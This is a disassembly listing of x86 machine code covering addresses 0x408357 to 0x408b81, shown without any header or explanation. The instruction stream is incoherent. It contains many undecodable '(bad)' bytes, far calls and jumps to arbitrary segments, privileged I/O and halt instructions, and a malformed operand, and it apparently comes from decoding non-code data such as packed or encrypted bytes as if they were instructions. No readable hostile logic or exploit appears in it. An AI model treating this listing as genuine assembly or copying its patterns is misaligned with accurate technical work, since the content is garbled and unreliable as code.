  408357:	icebp  
  408358:	add    BYTE PTR [edi-0x363c271e],dl
  40835e:	mov    ds:0xcdd234ba,eax
  408363:	(bad)  
  408364:	js     0x4083e5
  408366:	scas   al,BYTE PTR es:[edi]
  408367:	dec    eax
  408368:	inc    edi
  408369:	ret    
  40836a:	not    DWORD PTR [esi-0x63413cfc]
  408370:	cmp    ebx,DWORD PTR [edi+0x2c]
  408373:	adc    DWORD PTR [eax+ebp*2],0xffffffec
  408377:	int    0xd3
  408379:	add    al,0x67
  40837b:	test   al,0x5f
  40837d:	aad    0x81
  40837f:	pop    ss
  408380:	int3   
  408381:	xor    ah,bh
  408383:	movzx  ebx,BYTE PTR [bx+si]
  408387:	inc    esi
  408388:	sbb    DWORD PTR cs:[edi-0x28a2ced3],ebx
  40838f:	(bad)  
  408390:	lock pusha 
  408392:	mov    WORD PTR [ebx+0x35],ss
  408395:	pop    ecx
  408396:	dec    eax
  408397:	jae    0x408413
  408399:	mov    ch,0x93
  40839b:	inc    esp
  40839c:	mov    al,0xe4
  40839e:	retf   0x95f5
  4083a1:	fnstcw WORD PTR [eax-0x784b12a9]
  4083a7:	cmp    al,0x94
  4083a9:	out    dx,al
  4083aa:	ds jne 0x4083f2
  4083ad:	mov    WORD PTR [edi-0x50dee13a],fs
  4083b3:	jne    0x408340
  4083b5:	or     ebx,DWORD PTR [ebx-0x2ab41370]
  4083bb:	mov    esp,0xfa362e38
  4083c0:	or     al,0x2c
  4083c2:	jb     0x4083c4
  4083c4:	ror    al,0x24
  4083c7:	rol    BYTE PTR [edx-0xd8f66d8],0x42
  4083ce:	and    DWORD PTR [eax+0x20],esp
  4083d1:	jge    0x408406
  4083d3:	jge    0x40837c
  4083d5:	pop    esi
  4083d6:	cwde   
  4083d7:	sub    al,BYTE PTR [esi+0x10d84b0f]
  4083dd:	pop    ecx
  4083de:	icebp  
  4083df:	mov    al,0xd9
  4083e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083e2:	(bad)  [eax-0x5c07f9ad]
  4083e8:	lahf   
  4083e9:	leave  
  4083ea:	sub    al,dl
  4083ec:	rcl    ch,1
  4083ee:	jg     0x4083f4
  4083f0:	lea    ebp,[ebx-0x69b7a13a]
  4083f6:	jg     0x4083d9
  4083f8:	fnstsw WORD PTR [eax]
  4083fa:	sub    ecx,edx
  4083fc:	jo     0x408415
  4083fe:	inc    edx
  4083ff:	jnp    0x408439
  408401:	gs and eax,0xe5504dc9
  408407:	cmp    BYTE PTR [ebp+0x5a730626],al
  40840d:	pop    ss
  40840e:	iret   
  40840f:	dec    esp
  408410:	(bad)  
  408411:	sbb    al,0xb0
  408413:	inc    ecx
  408414:	jo     0x408490
  408416:	mov    ah,0x4f
  408418:	test   eax,0xa0bef5a5
  40841d:	cs xor eax,0xa0514198
  408423:	nop
  408424:	pop    edx
  408425:	jge    0x4083f3
  408427:	jmp    0xc22fffff
  40842c:	add    BYTE PTR [esi],0x97
  40842f:	and    ebp,DWORD PTR [ebx+ecx*2]
  408432:	and    al,0x82
  408434:	js     0x4084ac
  408436:	mov    ecx,fs
  408438:	out    dx,eax
  408439:	sub    BYTE PTR [edx+0x5d],ch
  40843c:	sbb    DWORD PTR [edx+0x2e],ecx
  40843f:	sub    BYTE PTR [esi-0x55],0xc2
  408443:	dec    esp
  408444:	mov    dl,0x88
  408446:	rcr    BYTE PTR ds:0xb85b63a3,0x8d
  40844d:	fist   WORD PTR [edi]
  40844f:	inc    ebx
  408450:	hlt    
  408451:	daa    
  408452:	mov    ch,0xb8
  408454:	ds into 
  408456:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408457:	div    BYTE PTR [eax]
  408459:	xchg   esi,eax
  40845a:	xor    BYTE PTR [eax-0x7273d1d2],0x96
  408461:	pop    es
  408462:	fcmovb st,st(0)
  408464:	daa    
  408465:	stos   BYTE PTR es:[edi],al
  408466:	mov    cl,0xed
  408468:	adc    esi,ecx
  40846a:	xor    eax,0xdaed1013
  40846f:	icebp  
  408470:	(bad)  
  408471:	mov    al,ds:0x1dca4aa6
  408476:	cmpxchg DWORD PTR [ebx+0x62],ecx
  40847a:	call   0x55e7:0x7c08caf2
  408481:	mov    bh,0x5
  408483:	cmp    bh,BYTE PTR [ebx-0xb]
  408486:	or     BYTE PTR [ecx-0xd],al
  408489:	retf   
  40848a:	push   edx
  40848b:	lods   eax,DWORD PTR ds:[esi]
  40848c:	inc    edi
  40848d:	mov    ah,0x63
  40848f:	xor    eax,0xc0568495
  408494:	push   ds
  408495:	mov    ah,BYTE PTR [eax]
  408497:	loopne 0x408436
  408499:	(bad)  
  40849b:	test   al,0x7d
  40849d:	push   ecx
  40849e:	adc    ch,BYTE PTR [esi+0x6e]
  4084a1:	dec    ebx
  4084a2:	push   eax
  4084a3:	loopne 0x408448
  4084a5:	nop
  4084a6:	cli    
  4084a7:	mov    edi,0xfbff4d1a
  4084ac:	sar    edx,1
  4084ae:	stos   DWORD PTR es:[edi],eax
  4084af:	jp     0x4084a9
  4084b1:	adc    ebx,0x58
  4084b4:	ret    
  4084b5:	jmp    0xc4d50efa
  4084ba:	jl     0x408498
  4084bc:	inc    edx
  4084bd:	in     al,dx
  4084be:	add    DWORD PTR [eax+0x20],0xb48d625f
  4084c5:	add    dl,BYTE PTR gs:[esi]
  4084c8:	cmp    DWORD PTR [ebx+edi*8-0x26a7ad74],0x61304780
  4084d3:	push   ebx
  4084d4:	mov    ah,BYTE PTR [eax]
  4084d6:	push   cs
  4084d7:	mov    eax,ds:0x8b7f255d
  4084dc:	and    eax,0xef69e7b6
  4084e1:	pushf  
  4084e2:	jns    0x4084f1
  4084e4:	xchg   esp,eax
  4084e5:	mov    esp,0xf3ad5add
  4084ea:	jmp    0x118e:0xd9df520
  4084f1:	(bad)  
  4084f2:	call   0xde2a:0xecd621aa
  4084f9:	sbb    al,0x2c
  4084fb:	neg    ch
  4084fd:	das    
  4084fe:	sahf   
  4084ff:	loope  0x408507
  408501:	into   
  408502:	sbb    DWORD PTR [ebx],ecx
  408504:	mov    dl,0x5
  408506:	pop    edx
  408507:	sub    al,0x5b
  408509:	ins    BYTE PTR es:[edi],dx
  40850a:	xchg   edx,eax
  40850b:	pop    ebp
  40850c:	mov    edx,0x8c5038ce
  408511:	inc    edx
  408512:	les    esi,FWORD PTR [edx+0x1e927ca7]
  408518:	test   eax,0x8a9bb473
  40851d:	sbb    ecx,DWORD PTR [ebp+0x5573d2b4]
  408523:	pop    ebx
  408524:	retf   
  408525:	pop    edx
  408526:	iret   
  408527:	adc    BYTE PTR [ebx],dl
  408529:	int    0x38
  40852b:	clc    
  40852c:	mov    BYTE PTR [ecx+0x55],dl
  40852f:	xor    ebx,DWORD PTR [eax+0x4859044a]
  408535:	jmp    0x9209c299
  40853a:	imul   ebp,DWORD PTR [edi-0x1624ac05],0xb9f28c7c
  408544:	dec    ebp
  408545:	addr16 push edx
  408547:	push   es
  408548:	push   edi
  408549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40854a:	cmp    bl,BYTE PTR [eax]
  40854c:	pop    eax
  40854d:	out    0x97,eax
  40854f:	mov    ecx,0xeab04ff7
  408554:	sub    al,0x16
  408556:	add    DWORD PTR [ebx-0x5b],ebp
  408559:	add    bl,bh
  40855b:	xor    esi,0xffffffac
  40855e:	jae    0x40853d
  408560:	(bad)  
  408561:	hlt    
  408562:	xchg   edx,eax
  408563:	add    DWORD PTR [edi+0x7553984a],0xffffffdd
  40856a:	adc    BYTE PTR [ecx],bh
  40856c:	jnp    0x40856f
  40856e:	pop    ebx
  40856f:	fs loope 0x408517
  408572:	mov    ah,ah
  408574:	imul   esi,ebp,0xffffffe2
  408577:	sbb    DWORD PTR [eax],ebp
  408579:	ret    0xe7d5
  40857c:	mov    ds:0xda0f1cf8,eax
  408581:	pop    ebx
  408583:	pop    ds
  408584:	imul   esi,esp,0x8a5df839
  40858a:	out    dx,eax
  40858b:	or     DWORD PTR [esi],0x9fa8e771
  408591:	adc    eax,0xc15af548
  408596:	mov    ebx,DWORD PTR [bx-0x5249]
  40859b:	std    
  40859c:	int3   
  40859d:	mov    cl,0x5c
  40859f:	les    ebp,FWORD PTR [ebp+0x57539bd7]
  4085a5:	sub    BYTE PTR [eax-0x5a],bl
  4085a8:	inc    ebx
  4085a9:	add    DWORD PTR [ebx-0x5b9a162f],ebx
  4085af:	fwait
  4085b0:	sahf   
  4085b1:	rcr    edi,cl
  4085b3:	enter  0xa37e,0x15
  4085b7:	(bad)  
  4085b8:	mov    eax,DWORD PTR [ebx+edi*4-0x545427c3]
  4085bf:	in     al,dx
  4085c0:	dec    ecx
  4085c1:	lahf   
  4085c2:	(bad)  
  4085c3:	(bad)  
  4085c4:	pushf  
  4085c5:	fnsave [esi+0x79]
  4085c8:	push   cs
  4085c9:	pushf  
  4085ca:	sti    
  4085cb:	(bad)  
  4085cc:	out    dx,eax
  4085cd:	adc    al,0x82
  4085cf:	fwait
  4085d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085d1:	ja     0x408614
  4085d3:	pop    ss
  4085d4:	into   
  4085d5:	cmc    
  4085d6:	pusha  
  4085d7:	pop    ebx
  4085d8:	call   0xba8b:0xfb60cf06
  4085df:	jnp    0x4085aa
  4085e1:	aad    0xdd
  4085e3:	idiv   DWORD PTR [ecx]
  4085e5:	and    eax,0x37948088
  4085ea:	(bad)  
  4085eb:	or     DWORD PTR [esi-0x380cc92],ebx
  4085f1:	cld    
  4085f2:	ror    DWORD PTR [edi+0x2b],1
  4085f5:	mov    eax,0xbab59a38
  4085fa:	mov    ecx,0x8027e776
  4085ff:	adc    DWORD PTR [esi+ebx*1+0x9],0xb
  408604:	clc    
  408605:	or     ebp,DWORD PTR [ecx+0x4]
  408608:	(bad)  
  40860a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40860b:	and    al,BYTE PTR [esi+0xeddb1f9]
  408611:	xchg   esp,eax
  408612:	cmp    DWORD PTR [ebx+0x117b7517],eax
  408618:	xchg   ecx,eax
  408619:	dec    esp
  40861a:	add    BYTE PTR ds:[eax+0x56744916],0xed
  408622:	mov    WORD PTR [eax-0x57],fs
  408625:	sub    BYTE PTR [esi+0x24],0x94
  408629:	sbb    al,0xab
  40862b:	out    0x92,eax
  40862d:	dec    DWORD PTR [eax]
  40862f:	inc    ebx
  408630:	fs cmp al,0x7
  408633:	jg     0x408671
  408635:	mov    eax,ds:0x9b36fffb
  40863a:	sti    
  40863b:	dec    ebp
  40863c:	pop    ebp
  40863d:	aas    
  40863e:	std    
  40863f:	imul   edx,DWORD PTR [esi+ebp*4+0x62],0x20
  408644:	inc    edi
  408645:	xor    DWORD PTR [eax+0x1ae3c],ebx
  40864b:	fstp   QWORD PTR [ebx]
  40864d:	and    bl,BYTE PTR [edi]
  40864f:	adc    ch,BYTE PTR [ebp+0x51]
  408652:	out    dx,al
  408653:	inc    ebx
  408654:	mov    dl,0xb8
  408656:	add    eax,0x9cf931b
  40865b:	pop    ebp
  40865c:	test   DWORD PTR ds:0x9c8bcb50,ebx
  408662:	popf   
  408663:	mov    ds:0x2c8f0941,eax
  408668:	leave  
  408669:	fist   WORD PTR [eax]
  40866b:	pop    eax
  40866c:	or     edi,DWORD PTR [eax+0x76]
  40866f:	and    al,BYTE PTR [esi+0x43]
  408672:	ret    
  408673:	popf   
  408674:	and    al,0xb2
  408676:	jg     0x408616
  408678:	xchg   ecx,eax
  408679:	mov    BYTE PTR [eax+0x7f],bl
  40867c:	inc    edx
  40867d:	mov    ebx,0xbbc6dd28
  408682:	sbb    edx,edi
  408684:	test   BYTE PTR [eax],al
  408686:	push   edx
  408687:	adc    cl,dh
  408689:	je     0x408697
  40868b:	inc    esp
  40868c:	pop    edx
  40868d:	inc    edi
  40868e:	jne    0x4086ad
  408690:	sbb    DWORD PTR [esi-0x5212531f],0xc6aa8b12
  40869a:	(bad)  
  40869b:	aas    
  40869c:	fisub  WORD PTR [edi-0x4e]
  40869f:	push   ebp
  4086a0:	in     eax,dx
  4086a1:	jne    0x408721
  4086a3:	lahf   
  4086a4:	in     al,0xf1
  4086a6:	arpl   WORD PTR [ecx+0x15af2dba],di
  4086ac:	dec    eax
  4086ad:	add    eax,0x8c5407b4
  4086b2:	int    0xfe
  4086b4:	push   ds
  4086b5:	inc    ecx
  4086b6:	add    BYTE PTR [ebx-0x294a723],cl
  4086bc:	pop    eax
  4086bd:	out    dx,al
  4086be:	xchg   esp,eax
  4086bf:	jnp    0x4086f7
  4086c1:	jae    0x408700
  4086c3:	lea    ebx,[eax]
  4086c5:	repz lahf 
  4086c7:	jb     0x408660
  4086c9:	dec    ecx
  4086ca:	jo     0x408709
  4086cc:	xchg   ecx,eax
  4086cd:	mov    al,ds:0x1188fb80
  4086d2:	mov    ebp,0x16847ca8
  4086d7:	push   ds
  4086d8:	or     esp,DWORD PTR [ecx+0x4a]
  4086db:	jnp    0x4086ac
  4086dd:	mov    eax,ds:0x716044de
  4086e2:	retf   
  4086e3:	les    ebx,FWORD PTR [edx]
  4086e5:	add    eax,0xa49e3f46
  4086ea:	inc    edx
  4086eb:	cmp    esp,DWORD PTR [edi+ebx*8]
  4086ee:	xor    dl,BYTE PTR [ebx]
  4086f0:	ss in  al,dx
  4086f2:	clc    
  4086f3:	push   eax
  4086f4:	add    eax,0x3cdadc80
  4086f9:	fbstp  TBYTE PTR [eax]
  4086fb:	jnp    0x408743
  4086fd:	pushf  
  4086fe:	pop    es
  4086ff:	pop    eax
  408700:	add    ebx,DWORD PTR [edx-0x59]
  408703:	or     bh,BYTE PTR [ecx]
  408705:	pop    es
  408706:	mov    eax,ds:0x419d536d
  40870b:	dec    ecx
  40870c:	test   BYTE PTR [ebp-0x43ee95c0],0x39
  408713:	mov    esi,0x3230aa80
  408718:	sbb    eax,0x3822448
  40871d:	(bad)  
  40871e:	lea    edx,[ebp+0x77364286]
  408724:	pop    ss
  408725:	push   0x1243be73
  40872a:	cs pop ebx
  40872c:	mov    edx,cs
  40872e:	ror    DWORD PTR [ecx],1
  408730:	std    
  408731:	or     al,0xe2
  408733:	sub    DWORD PTR [esi+0x8e4b499],edi
  408739:	ins    BYTE PTR es:[edi],dx
  40873a:	lea    edx,[ebx+0x14]
  40873d:	mov    dh,0x45
  40873f:	iret   
  408740:	imul   edx,DWORD PTR [eax+0xc],0x2d
  408744:	jne    0x408785
  408746:	adc    eax,0x1baa0472
  40874b:	test   eax,0x298a034d
  408750:	mov    ebx,0xaead34e2
  408755:	or     dl,ch
  408757:	jo     0x40874a
  408759:	pushf  
  40875a:	pop    ecx
  40875b:	mov    al,0x7f
  40875d:	jne    0x4086ee
  40875f:	xchg   ah,cl
  408761:	or     eax,0xa57b9b8f
  408766:	mov    dh,BYTE PTR [eax+0x71949b8]
  40876c:	cmp    eax,0xaf707599
  408771:	ins    DWORD PTR es:[edi],dx
  408772:	ret    
  408773:	adc    eax,0x12c1c86a
  408778:	jmp    0x171da6c
  40877d:	jle    0x408708
  40877f:	mov    edx,0x7efe544d
  408784:	add    eax,0x760e158d
  408789:	sbb    DWORD PTR [esi-0x46],esi
  40878c:	daa    
  40878d:	test   eax,0x8a9f37d4
  408792:	adc    DWORD PTR [edx+0x24],ecx
  408795:	push   esp
  408796:	or     eax,0x81d66822
  40879b:	jg     0x4087de
  40879d:	in     al,dx
  40879e:	cld    
  40879f:	pop    edx
  4087a0:	cli    
  4087a1:	mov    edx,0x4849a8f9
  4087a6:	mov    bh,BYTE PTR [eax+0x7]
  4087a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087aa:	add    bl,ah
  4087ac:	call   0xd45de727
  4087b1:	inc    eax
  4087b2:	ins    BYTE PTR es:[edi],dx
  4087b3:	cmp    dl,0x1e
  4087b6:	pop    es
  4087b7:	imul   ebp,esi,0x50d171bb
  4087bd:	fxam   
  4087bf:	or     DWORD PTR [ecx+eax*4],esi
  4087c2:	popf   
  4087c3:	shl    DWORD PTR [eax-0xd1b8023],0x3d
  4087ca:	sbb    esp,DWORD PTR [edi+0x1894a6f3]
  4087d0:	das    
  4087d1:	lahf   
  4087d2:	jno    0x408812
  4087d4:	imul   edx,eax,0xfffffff4
  4087d7:	call   0x8da4:0xe888b3cb
  4087de:	mov    esi,0xd5a42507
  4087e3:	xor    BYTE PTR [edx+0x44],0xa7
  4087e7:	call   eax
  4087e9:	out    0x67,eax
  4087eb:	jp     0x4087c6
  4087ed:	or     ecx,DWORD PTR [esi-0x23]
  4087f0:	jmp    0x408815
  4087f2:	test   DWORD PTR [edx+eax*8-0x7c33c7c0],0x69d65975
  4087fd:	rcl    DWORD PTR [eax-0x6211394c],1
  408803:	mov    edx,0xfeb4f2ac
  408808:	mov    eax,ds:0x12aaf468
  40880d:	cmp    BYTE PTR [ebx-0x59228b71],0xb8
  408814:	loope  0x4087a7
  408816:	hlt    
  408817:	sub    edx,DWORD PTR [ebx-0x3a094b04]
  40881d:	stos   BYTE PTR es:[edi],al
  40881e:	(bad)  
  40881f:	push   eax
  408820:	iret   
  408821:	adc    al,0x58
  408823:	dec    esi
  408824:	and    edx,DWORD PTR [esi-0x5a]
  408827:	aas    
  408828:	(bad)  
  408829:	ins    BYTE PTR es:[edi],dx
  40882a:	pop    ss
  40882b:	mov    al,bl
  40882d:	into   
  40882e:	cwde   
  40882f:	mov    dl,0x15
  408831:	fcmovbe st,st(1)
  408833:	xor    eax,0x5c7d2fa
  408838:	mov    esp,0x5179999f
  40883d:	ja     0x408856
  40883f:	inc    eax
  408840:	mov    ecx,0x4882906f
  408845:	pop    DWORD PTR [esi+0x13]
  408848:	rcr    edi,cl
  40884a:	or     esi,esp
  40884c:	shr    BYTE PTR [esi+0x4d76a4fb],0xdd
  408853:	stos   DWORD PTR es:[edi],eax
  408854:	retf   
  408855:	adc    cl,BYTE PTR [ecx+0x3a6dab93]
  40885b:	jg     0x408802
  40885d:	xlat   BYTE PTR ds:[ebx]
  40885e:	div    BYTE PTR [ebp-0x3070c4b2]
  408864:	aam    0xb
  408866:	and    eax,0xae7d1cf7
  40886b:	mov    al,0xde
  40886d:	pop    edx
  40886e:	(bad)  
  40886f:	scas   al,BYTE PTR es:[edi]
  408870:	int3   
  408871:	xchg   ecx,eax
  408872:	icebp  
  408873:	sbb    eax,DWORD PTR [edi+edi*8]
  408876:	mov    cl,0x58
  408878:	xchg   ebx,eax
  408879:	dec    bl
  40887b:	daa    
  40887c:	add    BYTE PTR [ebx+0x5b],bh
  40887f:	stos   BYTE PTR es:[edi],al
  408880:	push   ebx
  408881:	lock inc esi
  408883:	xlat   BYTE PTR ds:[ebx]
  408884:	sbb    edx,ecx
  408886:	push   es
  408887:	inc    BYTE PTR [eax]
  408889:	jmp    DWORD PTR [esp+esi*1+0x6a]
  40888d:	and    eax,0x2cb483a6
  408892:	jne    0x408836
  408894:	jle    0x4088e5
  408896:	pop    es
  408897:	in     eax,dx
  408898:	out    dx,eax
  408899:	in     al,dx
  40889a:	cwde   
  40889b:	jmp    0x408854
  40889d:	enter  0xfb09,0xd5
  4088a1:	imul   ecx,eax,0xffffff8a
  4088a4:	out    0xe1,eax
  4088a6:	popf   
  4088a7:	retf   
  4088a8:	stos   DWORD PTR es:[edi],eax
  4088a9:	sbb    eax,0x3da06d2
  4088ae:	leave  
  4088af:	out    0x8e,al
  4088b1:	xchg   edx,eax
  4088b2:	jl     0x408892
  4088b4:	sub    al,0xa1
  4088b6:	xor    eax,0xfacf7fd0
  4088bb:	js     0x408920
  4088bd:	repz call FWORD PTR [ecx-0x50]
  4088c1:	and    DWORD PTR [ecx-0x4901a894],0xc4e788e4
  4088cb:	push   edx
  4088cc:	jnp    0x4088e3
  4088ce:	cmp    ah,BYTE PTR ds:0xd3a848fc
  4088d4:	jmp    0x9d09463
  4088d9:	jno    0x4088ef
  4088db:	jle    0x40892e
  4088dd:	add    edx,DWORD PTR [esi+ecx*8+0x6fda830f]
  4088e4:	scas   eax,DWORD PTR es:[edi]
  4088e5:	sub    DWORD PTR [eax-0x17],ecx
  4088e8:	inc    eax
  4088e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088ea:	call   0xa88c9e65
  4088ef:	xor    edi,ebp
  4088f1:	mov    ch,0x65
  4088f3:	popa   
  4088f4:	xchg   esp,eax
  4088f5:	cmp    DWORD PTR fs:[edx-0x14cd34e6],esp
  4088fc:	daa    
  4088fd:	(bad)  
  4088fe:	repnz mov BYTE PTR [edx+esi*8],bl
  408902:	fsub   DWORD PTR [edx+ecx*4+0x30]
  408906:	mov    ebx,0x1ae33e7b
  40890b:	enter  0x9700,0xf1
  40890f:	xchg   ebx,eax
  408910:	sub    bl,BYTE PTR [ebx+0x2d]
  408913:	lods   eax,DWORD PTR ds:[esi]
  408914:	inc    ebp
  408915:	test   BYTE PTR [ebp-0x76dc1de1],0xb5
  40891c:	cmc    
  40891d:	xchg   DWORD PTR [ebp-0x20],eax
  408920:	adc    BYTE PTR [edi+ecx*8+0x5b],al
  408924:	jne    0x4088cd
  408926:	in     al,0x9f
  408928:	xchg   esp,eax
  408929:	jp     0x4088dc
  40892b:	adc    BYTE PTR [eax-0x1c389a98],ah
  408931:	jp     0x408986
  408933:	ficomp WORD PTR [edx-0x4fbc51fd]
  408939:	sub    bh,BYTE PTR [ebx]
  40893b:	popf   
  40893c:	or     eax,0xe9b280ab
  408941:	aam    0x62
  408943:	dec    esp
  408944:	nop    eax
  408947:	leave  
  408948:	sub    BYTE PTR [ebx-0xa],cl
  40894b:	pop    esp
  40894c:	xor    eax,eax
  40894e:	add    BYTE PTR [ebx+0x5286201b],cl
  408954:	mov    eax,ds:0xade153d5
  408959:	ins    BYTE PTR es:[edi],dx
  40895a:	adc    ebp,DWORD PTR [ecx]
  40895c:	cmp    ebx,DWORD PTR [esi-0x2477874d]
  408962:	adc    BYTE PTR [edx-0x5a444951],dl
  408968:	adc    DWORD PTR [ecx+0x42fb4062],ebx
  40896e:	or     dl,bl
  408970:	pop    ds
  408971:	call   0x4666:0x3e8e0c80
  408978:	outs   dx,BYTE PTR ds:[esi]
  408979:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40897a:	imul   ecx,DWORD PTR [edx-0x6d],0x56dda9c9
  408981:	rol    cl,1
  408983:	in     al,0x0
  408985:	mov    ebx,DWORD PTR [ecx-0x11]
  408988:	jge    0x40895f
  40898a:	sar    esi,cl
  40898c:	out    0x53,eax
  40898e:	out    0x3d,al
  408990:	jns    0x408929
  408992:	sub    al,0xe5
  408994:	push   esi
  408995:	cmp    DWORD PTR [eax+0x14600a16],esp
  40899b:	mov    ds:0x4b9867cb,al
  4089a0:	jmp    0xc46ab001
  4089a5:	mov    ?,WORD PTR [ecx-0x77]
  4089a8:	cmp    al,dh
  4089aa:	pop    ebx
  4089ab:	leave  
  4089ac:	pop    ebp
  4089ad:	out    0xb5,al
  4089af:	in     al,0xbe
  4089b1:	pop    ebx
  4089b2:	cwde   
  4089b3:	(bad)  
  4089b5:	out    dx,eax
  4089b6:	adc    esp,DWORD PTR [edx+0x4168d7d0]
  4089bc:	mov    BYTE PTR [edx],bl
  4089be:	jmp    DWORD PTR [eax+0x70]
  4089c1:	loop   0x408a2f
  4089c3:	xor    al,0xe2
  4089c5:	js     0x40896d
  4089c7:	(bad)  
  4089c8:	in     eax,dx
  4089c9:	xchg   esi,eax
  4089ca:	lock push edi
  4089cc:	jge    0x408a04
  4089ce:	nop
  4089cf:	(bad)  
  4089d0:	loope  0x408a11
  4089d2:	data16 hlt 
  4089d4:	mov    edi,DWORD PTR [edi+0x6d]
  4089d7:	jnp    0x408a35
  4089d9:	jg     0x4089b4
  4089db:	jnp    0x4089d6
  4089dd:	pop    ds
  4089de:	inc    ecx
  4089df:	adc    DWORD PTR [esi],0x22
  4089e2:	inc    edx
  4089e3:	add    DWORD PTR [eax-0x60],ebx
  4089e6:	popa   
  4089e7:	in     al,dx
  4089e8:	mov    ebp,0xc35fe17d
  4089ed:	ja     0x408a49
  4089ef:	dec    edi
  4089f0:	mov    ebp,0xc21dce6a
  4089f5:	in     eax,0x4
  4089f7:	enter  0xf84c,0xe9
  4089fb:	repnz mov edi,0x33a800f9
  408a01:	lds    ebp,FWORD PTR [ecx+0xe]
  408a04:	cmp    dh,bl
  408a06:	repnz xor DWORD PTR [edi],ebx
  408a09:	sub    ebx,DWORD PTR [esi+edx*4-0x63d829ce]
  408a10:	cmp    DWORD PTR [esi-0x33c581bc],esp
  408a16:	fs pop edi
  408a18:	int3   
  408a19:	and    al,0x8b
  408a1b:	or     al,0xb0
  408a1d:	jno    0x4089ca
  408a1f:	mov    eax,ds:0xfd1e6b9f
  408a24:	loop   0x408a7a
  408a26:	mov    eax,ds:0x6bc9060f
  408a2b:	mov    ah,0x1b
  408a2d:	fisttp DWORD PTR [esi]
  408a2f:	daa    
  408a30:	out    dx,al
  408a31:	dec    eax
  408a32:	cmc    
  408a33:	mov    esp,0xa63f3c3b
  408a38:	add    esp,DWORD PTR [edi+0x7757b1cc]
  408a3e:	jle    0x408a23
  408a40:	sub    esi,DWORD PTR [ebx+0x5c]
  408a43:	jno    0x408a65
  408a45:	js     0x408abe
  408a47:	cmp    al,0x41
  408a49:	sti    
  408a4a:	call   0x6d7481cf
  408a4f:	add    bh,BYTE PTR ds:0xee1a8615
  408a55:	loop   0x408a32
  408a57:	test   al,0xcf
  408a59:	jecxz  0x408a3e
  408a5b:	nop
  408a5c:	mov    eax,esp
  408a5e:	out    0xb3,eax
  408a60:	inc    ebp
  408a61:	test   edx,0xb184ca4d
  408a67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a68:	loope  0x408a06
  408a6a:	in     al,0x6a
  408a6c:	inc    ecx
  408a6d:	mov    al,ds:0x4608e313
  408a72:	and    eax,0x6ced5141
  408a77:	or     edx,DWORD PTR [ecx+0x79]
  408a7a:	cdq    
  408a7b:	jmp    FWORD PTR [edx-0x2a]
  408a7e:	out    dx,al
  408a7f:	push   ss
  408a80:	call   0xd98c39db
  408a85:	je     0x408aa0
  408a87:	test   BYTE PTR [esi+ecx*4+0x4c9e9ebe],0x5b
  408a8f:	cmp    ecx,DWORD PTR [ebp*4-0x1de287bb]
  408a96:	mov    edx,0x333f13d9
  408a9b:	ret    
  408a9c:	mov    eax,ds:0x3cce6914
  408aa1:	call   0xf86e:0x97e79367
  408aa8:	clc    
  408aa9:	(bad)  
  408aaa:	stos   BYTE PTR es:[edi],al
  408aab:	fidiv  WORD PTR [edi+eax*8+0x31]
  408aaf:	and    esi,0x46bed82b
  408ab5:	push   ebx
  408ab6:	jne    0x408a60
  408ab8:	mov    fs,WORD PTR [ecx]
  408aba:	popa   
  408abb:	aad    0xcf
  408abd:	ja     0x408b15
  408abf:	in     eax,dx
  408ac0:	cmpxchg DWORD PTR [eax+0x4ac2ec4a],edi
  408ac7:	cs into 
  408ac9:	jne    0x408acb
  408acb:	out    0xc5,al
  408acd:	adc    BYTE PTR [edi],dl
  408acf:	out    dx,eax
  408ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ad1:	adc    esp,DWORD PTR [ebp-0x2afc6949]
  408ad7:	fsub   QWORD PTR [eax-0x7b584790]
  408add:	enter  0x5eaa,0x21
  408ae1:	pop    ss
  408ae2:	sahf   
  408ae3:	pop    es
  408ae4:	and    bl,BYTE PTR [ebx]
  408ae6:	sub    eax,0xaf0bf5d0
  408aeb:	lahf   
  408aec:	xchg   DWORD PTR [edi+eiz*1-0x5d8faee3],edi
  408af3:	push   esi
  408af4:	pop    edi
  408af5:	push   edx
  408af6:	cmp    eax,0xb9ecc45b
  408afb:	and    ch,BYTE PTR [ecx]
  408afd:	loop   0x408b2f
  408aff:	pop    esp
  408b00:	push   ss
  408b01:	add    DWORD PTR [esi],0xffffffe3
  408b04:	add    BYTE PTR [ebx-0x2d41e1be],cl
  408b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b0b:	mov    esp,0x7133e0f8
  408b10:	mov    esi,0x7a0a783e
  408b15:	arpl   WORD PTR [edx-0x1cf624a9],bx
  408b1b:	pop    ss
  408b1c:	xchg   ebp,eax
  408b1d:	outs   dx,DWORD PTR ds:[esi]
  408b1e:	hlt    
  408b1f:	dec    ecx
  408b20:	sub    DWORD PTR [esi+eax*1-0x268fe65e],esp
  408b27:	and    eax,0x229182aa
  408b2c:	pop    ds
  408b2d:	mov    ebp,0xf3a59c24
  408b32:	mov    dh,0x47
  408b34:	pushf  
  408b35:	mov    bl,0xe3
  408b37:	mov    ds:0xe5c2d73e,al
  408b3c:	sbb    dl,BYTE PTR [ecx-0x4536f4e4]
  408b42:	stos   BYTE PTR es:[edi],al
  408b43:	fs das 
  408b45:	(bad)
  408b49:	js     0x408b47
  408b4b:	imul   edx,DWORD PTR [ecx-0x488652df],0xfffffff7
  408b52:	(bad)  
  408b53:	jmp    0x408bd4
  408b55:	mov    ebx,DWORD PTR [edi]
  408b57:	and    eax,0xb62f0f3
  408b5c:	pop    esi
  408b5d:	scas   eax,DWORD PTR es:[edi]
  408b5e:	(bad)  
  408b5f:	not    BYTE PTR [ecx+0x54aca049]
  408b65:	sub    eax,0xb654bd14
  408b6a:	push   ds
  408b6b:	fmul   st(0),st
  408b6d:	hlt    
  408b6e:	(bad)  
  408b6f:	xchg   edi,eax
  408b70:	add    ebp,ecx
  408b72:	(bad)  
  408b73:	js     0x408b2e
  408b75:	xchg   DWORD PTR [eax+0x78],edi
  408b78:	push   ds
  408b79:	sbb    BYTE PTR [esi+0x378c13dc],al
  408b7f:	jp     0x408bba
  408b81:	cmp    edx,DWORD PTR ds:0xc29e7fa2
